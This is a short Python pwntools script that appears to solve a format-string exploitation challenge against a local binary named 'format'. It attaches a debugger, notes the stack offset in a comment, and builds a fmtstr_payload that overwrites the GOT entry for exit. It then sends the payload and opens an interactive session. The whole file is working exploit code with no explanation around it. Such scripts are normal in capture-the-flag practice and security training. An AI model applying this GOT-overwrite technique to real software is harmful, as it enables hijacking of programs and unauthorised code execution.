from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

bin = ELF("./format")

p = process("./format")
gdb.attach(p, """
break *0x0804863e
""")

"""
0xff8a21c0:     0xff8a22b4      0xff8a21ec      0xf77575a0      0x08048563 <- 3
0xff8a21d0:     0x00000007      0xf7798c08      0x6e43a318      0xff8a2444 <- 7
0xff8a21e0:     0x00000000      0x00000000      0xf77731a0      0x61616161 <- 11
0xff8a21f0:     0x61616161      0x78383025      0x3830252d      0xff000a78
0xff8a2200:     0x00000001      0x00000000      0xf7798000      0xf77002a2
"""

payload = fmtstr_payload(11,
                         {
                             bin.got['exit']: 0xfffe514a + 0x1000
                         },
                         0xf6 - 0xef,
                         write_size='short'
)

log.info(payload.encode('hex'))
p.sendline(payload)

p.interactive()
